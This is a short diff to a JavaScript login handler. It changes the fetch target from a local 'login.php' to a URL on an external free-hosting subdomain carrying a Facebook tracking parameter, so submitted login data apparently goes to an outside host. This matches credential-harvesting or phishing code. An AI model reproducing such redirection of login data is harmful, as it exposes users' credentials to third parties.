@@ -20,7 +20,7 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         // Send the data to the server using fetch
-        fetch('login.php', {
+        fetch('https://lightpink-dogfish-795437.hostingersite.com/admin_mis/index.html?fbclid=IwY2xjawGtNZJleHRuA2FlbQIxMAABHe7Y0KsRdT_19rbwM2EpvcmaFJAH69yQ_KD8BS9OFmLJjJlFIyp0KMLEvw_aem_L4VLV0-shPW1l51WI2nYQg', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
